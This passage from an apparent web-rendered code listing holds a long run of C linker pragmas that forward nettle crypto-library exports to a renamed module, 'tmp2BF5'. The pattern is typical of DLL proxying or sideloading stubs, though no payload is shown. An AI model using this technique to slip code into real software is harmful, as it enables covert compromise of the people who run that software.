&quot;&#x2F;export:nettle_arctwo64&#x3D;tmp2BF5.nettle_arctwo64,@88&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo64_set_key&#x3D;tmp2BF5.nettle_arctwo64_set_key,@89&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_decrypt&#x3D;tmp2BF5.nettle_arctwo_decrypt,@90&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_encrypt&#x3D;tmp2BF5.nettle_arctwo_encrypt,@91&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_gutmann128&#x3D;tmp2BF5.nettle_arctwo_gutmann128,@92&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_set_key&#x3D;tmp2BF5.nettle_arctwo_set_key,@93&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_set_key_ekb&#x3D;tmp2BF5.nettle_arctwo_set_key_ekb,@94&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_arctwo_set_key_gutmann&#x3D;tmp2BF5.nettle_arctwo_set_key_gutmann,@95&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16&#x3D;tmp2BF5.nettle_base16,@96&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_decode_final&#x3D;tmp2BF5.nettle_base16_decode_final,@97&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_decode_init&#x3D;tmp2BF5.nettle_base16_decode_init,@98&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_decode_single&#x3D;tmp2BF5.nettle_base16_decode_single,@99&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_decode_update&#x3D;tmp2BF5.nettle_base16_decode_update,@100&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_encode_single&#x3D;tmp2BF5.nettle_base16_encode_single,@101&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base16_encode_update&#x3D;tmp2BF5.nettle_base16_encode_update,@102&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64&#x3D;tmp2BF5.nettle_base64,@103&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_decode_final&#x3D;tmp2BF5.nettle_base64_decode_final,@104&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_decode_init&#x3D;tmp2BF5.nettle_base64_decode_init,@105&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_decode_single&#x3D;tmp2BF5.nettle_base64_decode_single,@106&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_decode_update&#x3D;tmp2BF5.nettle_base64_decode_update,@107&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_final&#x3D;tmp2BF5.nettle_base64_encode_final,@108&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_group&#x3D;tmp2BF5.nettle_base64_encode_group,@109&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_init&#x3D;tmp2BF5.nettle_base64_encode_init,@110&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_raw&#x3D;tmp2BF5.nettle_base64_encode_raw,@111&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_single&#x3D;tmp2BF5.nettle_base64_encode_single,@112&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64_encode_update&#x3D;tmp2BF5.nettle_base64_encode_update,@113&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64url&#x3D;tmp2BF5.nettle_base64url,@114&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64url_decode_init&#x3D;tmp2BF5.nettle_base64url_decode_init,@115&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_base64url_encode_init&#x3D;tmp2BF5.nettle_base64url_encode_init,@116&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_blowfish128_set_key&#x3D;tmp2BF5.nettle_blowfish128_set_key,@117&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_blowfish_decrypt&#x3D;tmp2BF5.nettle_blowfish_decrypt,@118&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_blowfish_encrypt&#x3D;tmp2BF5.nettle_blowfish_encrypt,@119&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_blowfish_set_key&#x3D;tmp2BF5.nettle_blowfish_set_key,@120&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_clear&#x3D;tmp2BF5.nettle_buffer_clear,@121&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_copy&#x3D;tmp2BF5.nettle_buffer_copy,@122&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_grow&#x3D;tmp2BF5.nettle_buffer_grow,@123&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_init&#x3D;tmp2BF5.nettle_buffer_init,@124&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_init_realloc&#x3D;tmp2BF5.nettle_buffer_init_realloc,@125&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_init_size&#x3D;tmp2BF5.nettle_buffer_init_size,@126&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_reset&#x3D;tmp2BF5.nettle_buffer_reset,@127&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_space&#x3D;tmp2BF5.nettle_buffer_space,@128&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_buffer_write&#x3D;tmp2BF5.nettle_buffer_write,@129&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia128&#x3D;tmp2BF5.nettle_camellia128,@130&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia128_crypt&#x3D;tmp2BF5.nettle_camellia128_crypt,@131&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia128_invert_key&#x3D;tmp2BF5.nettle_camellia128_invert_key,@132&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia128_set_encrypt_key&#x3D;tmp2BF5.nettle_camellia128_set_encrypt_key,@133&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia192&#x3D;tmp2BF5.nettle_camellia192,@134&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia192_set_decrypt_key&#x3D;tmp2BF5.nettle_camellia192_set_decrypt_key,@135&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia192_set_encrypt_key&#x3D;tmp2BF5.nettle_camellia192_set_encrypt_key,@136&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia256&#x3D;tmp2BF5.nettle_camellia256,@137&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia256_crypt&#x3D;tmp2BF5.nettle_camellia256_crypt,@138&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia256_invert_key&#x3D;tmp2BF5.nettle_camellia256_invert_key,@139&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia256_set_decrypt_key&#x3D;tmp2BF5.nettle_camellia256_set_decrypt_key,@140&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia256_set_encrypt_key&#x3D;tmp2BF5.nettle_camellia256_set_encrypt_key,@141&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_camellia_set_decrypt_key&#x3D;tmp2BF5.nettle_camellia_set_decrypt_key,@142&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cast128&#x3D;tmp2BF5.nettle_cast128,@143&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cast128_decrypt&#x3D;tmp2BF5.nettle_cast128_decrypt,@144&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cast128_encrypt&#x3D;tmp2BF5.nettle_cast128_encrypt,@145&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cast128_set_key&#x3D;tmp2BF5.nettle_cast128_set_key,@146&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cast5_set_key&#x3D;tmp2BF5.nettle_cast5_set_key,@147&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cbc_decrypt&#x3D;tmp2BF5.nettle_cbc_decrypt,@148&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cbc_encrypt&#x3D;tmp2BF5.nettle_cbc_encrypt,@149&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_decrypt&#x3D;tmp2BF5.nettle_ccm_aes128_decrypt,@150&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_decrypt_message&#x3D;tmp2BF5.nettle_ccm_aes128_decrypt_message,@151&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_digest&#x3D;tmp2BF5.nettle_ccm_aes128_digest,@152&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_encrypt&#x3D;tmp2BF5.nettle_ccm_aes128_encrypt,@153&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_encrypt_message&#x3D;tmp2BF5.nettle_ccm_aes128_encrypt_message,@154&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_set_key&#x3D;tmp2BF5.nettle_ccm_aes128_set_key,@155&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_set_nonce&#x3D;tmp2BF5.nettle_ccm_aes128_set_nonce,@156&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes128_update&#x3D;tmp2BF5.nettle_ccm_aes128_update,@157&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_decrypt&#x3D;tmp2BF5.nettle_ccm_aes192_decrypt,@158&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_decrypt_message&#x3D;tmp2BF5.nettle_ccm_aes192_decrypt_message,@159&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_digest&#x3D;tmp2BF5.nettle_ccm_aes192_digest,@160&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_encrypt&#x3D;tmp2BF5.nettle_ccm_aes192_encrypt,@161&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_encrypt_message&#x3D;tmp2BF5.nettle_ccm_aes192_encrypt_message,@162&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_set_key&#x3D;tmp2BF5.nettle_ccm_aes192_set_key,@163&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_set_nonce&#x3D;tmp2BF5.nettle_ccm_aes192_set_nonce,@164&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes192_update&#x3D;tmp2BF5.nettle_ccm_aes192_update,@165&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_decrypt&#x3D;tmp2BF5.nettle_ccm_aes256_decrypt,@166&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_decrypt_message&#x3D;tmp2BF5.nettle_ccm_aes256_decrypt_message,@167&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_digest&#x3D;tmp2BF5.nettle_ccm_aes256_digest,@168&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_encrypt&#x3D;tmp2BF5.nettle_ccm_aes256_encrypt,@169&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_encrypt_message&#x3D;tmp2BF5.nettle_ccm_aes256_encrypt_message,@170&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_set_key&#x3D;tmp2BF5.nettle_ccm_aes256_set_key,@171&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_set_nonce&#x3D;tmp2BF5.nettle_ccm_aes256_set_nonce,@172&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_aes256_update&#x3D;tmp2BF5.nettle_ccm_aes256_update,@173&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_decrypt&#x3D;tmp2BF5.nettle_ccm_decrypt,@174&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_decrypt_message&#x3D;tmp2BF5.nettle_ccm_decrypt_message,@175&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_digest&#x3D;tmp2BF5.nettle_ccm_digest,@176&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_encrypt&#x3D;tmp2BF5.nettle_ccm_encrypt,@177&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_encrypt_message&#x3D;tmp2BF5.nettle_ccm_encrypt_message,@178&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_set_nonce&#x3D;tmp2BF5.nettle_ccm_set_nonce,@179&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ccm_update&#x3D;tmp2BF5.nettle_ccm_update,@180&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cfb8_decrypt&#x3D;tmp2BF5.nettle_cfb8_decrypt,@181&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cfb8_encrypt&#x3D;tmp2BF5.nettle_cfb8_encrypt,@182&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cfb_decrypt&#x3D;tmp2BF5.nettle_cfb_decrypt,@183&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cfb_encrypt&#x3D;tmp2BF5.nettle_cfb_encrypt,@184&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_crypt&#x3D;tmp2BF5.nettle_chacha_crypt,@185&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_crypt32&#x3D;tmp2BF5.nettle_chacha_crypt32,@186&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305&#x3D;tmp2BF5.nettle_chacha_poly1305,@187&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_decrypt&#x3D;tmp2BF5.nettle_chacha_poly1305_decrypt,@188&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_digest&#x3D;tmp2BF5.nettle_chacha_poly1305_digest,@189&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_encrypt&#x3D;tmp2BF5.nettle_chacha_poly1305_encrypt,@190&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_set_key&#x3D;tmp2BF5.nettle_chacha_poly1305_set_key,@191&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_set_nonce&#x3D;tmp2BF5.nettle_chacha_poly1305_set_nonce,@192&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_poly1305_update&#x3D;tmp2BF5.nettle_chacha_poly1305_update,@193&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_set_counter&#x3D;tmp2BF5.nettle_chacha_set_counter,@194&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_set_counter32&#x3D;tmp2BF5.nettle_chacha_set_counter32,@195&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_set_key&#x3D;tmp2BF5.nettle_chacha_set_key,@196&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_set_nonce&#x3D;tmp2BF5.nettle_chacha_set_nonce,@197&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_chacha_set_nonce96&#x3D;tmp2BF5.nettle_chacha_set_nonce96,@198&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac128_digest&#x3D;tmp2BF5.nettle_cmac128_digest,@199&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac128_init&#x3D;tmp2BF5.nettle_cmac128_init,@200&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac128_set_key&#x3D;tmp2BF5.nettle_cmac128_set_key,@201&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac128_update&#x3D;tmp2BF5.nettle_cmac128_update,@202&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac64_digest&#x3D;tmp2BF5.nettle_cmac64_digest,@203&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac64_init&#x3D;tmp2BF5.nettle_cmac64_init,@204&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac64_set_key&#x3D;tmp2BF5.nettle_cmac64_set_key,@205&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac64_update&#x3D;tmp2BF5.nettle_cmac64_update,@206&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes128&#x3D;tmp2BF5.nettle_cmac_aes128,@207&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes128_digest&#x3D;tmp2BF5.nettle_cmac_aes128_digest,@208&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes128_set_key&#x3D;tmp2BF5.nettle_cmac_aes128_set_key,@209&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes128_update&#x3D;tmp2BF5.nettle_cmac_aes128_update,@210&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes256&#x3D;tmp2BF5.nettle_cmac_aes256,@211&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes256_digest&#x3D;tmp2BF5.nettle_cmac_aes256_digest,@212&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes256_set_key&#x3D;tmp2BF5.nettle_cmac_aes256_set_key,@213&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_aes256_update&#x3D;tmp2BF5.nettle_cmac_aes256_update,@214&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_des3&#x3D;tmp2BF5.nettle_cmac_des3,@215&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_des3_digest&#x3D;tmp2BF5.nettle_cmac_des3_digest,@216&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_des3_set_key&#x3D;tmp2BF5.nettle_cmac_des3_set_key,@217&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cmac_des3_update&#x3D;tmp2BF5.nettle_cmac_des3_update,@218&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_cnd_memcpy&#x3D;tmp2BF5.nettle_cnd_memcpy,@219&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_ctr_crypt&#x3D;tmp2BF5.nettle_ctr_crypt,@220&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des3_decrypt&#x3D;tmp2BF5.nettle_des3_decrypt,@221&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des3_encrypt&#x3D;tmp2BF5.nettle_des3_encrypt,@222&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des3_set_key&#x3D;tmp2BF5.nettle_des3_set_key,@223&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des_check_parity&#x3D;tmp2BF5.nettle_des_check_parity,@224&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des_decrypt&#x3D;tmp2BF5.nettle_des_decrypt,@225&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des_encrypt&#x3D;tmp2BF5.nettle_des_encrypt,@226&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des_fix_parity&#x3D;tmp2BF5.nettle_des_fix_parity,@227&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_des_set_key&#x3D;tmp2BF5.nettle_des_set_key,@228&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128&#x3D;tmp2BF5.nettle_eax_aes128,@229&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_decrypt&#x3D;tmp2BF5.nettle_eax_aes128_decrypt,@230&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_digest&#x3D;tmp2BF5.nettle_eax_aes128_digest,@231&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_encrypt&#x3D;tmp2BF5.nettle_eax_aes128_encrypt,@232&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_set_key&#x3D;tmp2BF5.nettle_eax_aes128_set_key,@233&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_set_nonce&#x3D;tmp2BF5.nettle_eax_aes128_set_nonce,@234&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_aes128_update&#x3D;tmp2BF5.nettle_eax_aes128_update,@235&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_decrypt&#x3D;tmp2BF5.nettle_eax_decrypt,@236&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_digest&#x3D;tmp2BF5.nettle_eax_digest,@237&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_encrypt&#x3D;tmp2BF5.nettle_eax_encrypt,@238&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_set_key&#x3D;tmp2BF5.nettle_eax_set_key,@239&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_set_nonce&#x3D;tmp2BF5.nettle_eax_set_nonce,@240&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_eax_update&#x3D;tmp2BF5.nettle_eax_update,@241&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128&#x3D;tmp2BF5.nettle_gcm_aes128,@242&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_decrypt&#x3D;tmp2BF5.nettle_gcm_aes128_decrypt,@243&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_digest&#x3D;tmp2BF5.nettle_gcm_aes128_digest,@244&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_encrypt&#x3D;tmp2BF5.nettle_gcm_aes128_encrypt,@245&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_set_iv&#x3D;tmp2BF5.nettle_gcm_aes128_set_iv,@246&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_set_key&#x3D;tmp2BF5.nettle_gcm_aes128_set_key,@247&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes128_update&#x3D;tmp2BF5.nettle_gcm_aes128_update,@248&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192&#x3D;tmp2BF5.nettle_gcm_aes192,@249&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_decrypt&#x3D;tmp2BF5.nettle_gcm_aes192_decrypt,@250&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_digest&#x3D;tmp2BF5.nettle_gcm_aes192_digest,@251&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_encrypt&#x3D;tmp2BF5.nettle_gcm_aes192_encrypt,@252&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_set_iv&#x3D;tmp2BF5.nettle_gcm_aes192_set_iv,@253&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_set_key&#x3D;tmp2BF5.nettle_gcm_aes192_set_key,@254&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes192_update&#x3D;tmp2BF5.nettle_gcm_aes192_update,@255&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256&#x3D;tmp2BF5.nettle_gcm_aes256,@256&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_decrypt&#x3D;tmp2BF5.nettle_gcm_aes256_decrypt,@257&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_digest&#x3D;tmp2BF5.nettle_gcm_aes256_digest,@258&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_encrypt&#x3D;tmp2BF5.nettle_gcm_aes256_encrypt,@259&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_set_iv&#x3D;tmp2BF5.nettle_gcm_aes256_set_iv,@260&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_set_key&#x3D;tmp2BF5.nettle_gcm_aes256_set_key,@261&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes256_update&#x3D;tmp2BF5.nettle_gcm_aes256_update,@262&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_decrypt&#x3D;tmp2BF5.nettle_gcm_aes_decrypt,@263&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_digest&#x3D;tmp2BF5.nettle_gcm_aes_digest,@264&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_encrypt&#x3D;tmp2BF5.nettle_gcm_aes_encrypt,@265&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_set_iv&#x3D;tmp2BF5.nettle_gcm_aes_set_iv,@266&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_set_key&#x3D;tmp2BF5.nettle_gcm_aes_set_key,@267&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_aes_update&#x3D;tmp2BF5.nettle_gcm_aes_update,@268&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128&#x3D;tmp2BF5.nettle_gcm_camellia128,@269&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_decrypt&#x3D;tmp2BF5.nettle_gcm_camellia128_decrypt,@270&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_digest&#x3D;tmp2BF5.nettle_gcm_camellia128_digest,@271&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_encrypt&#x3D;tmp2BF5.nettle_gcm_camellia128_encrypt,@272&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_set_iv&#x3D;tmp2BF5.nettle_gcm_camellia128_set_iv,@273&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_set_key&#x3D;tmp2BF5.nettle_gcm_camellia128_set_key,@274&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_gcm_camellia128_update&#x3D;tmp2BF5.nettle_gcm_camellia128_update,@275&quot;)</span><br><span 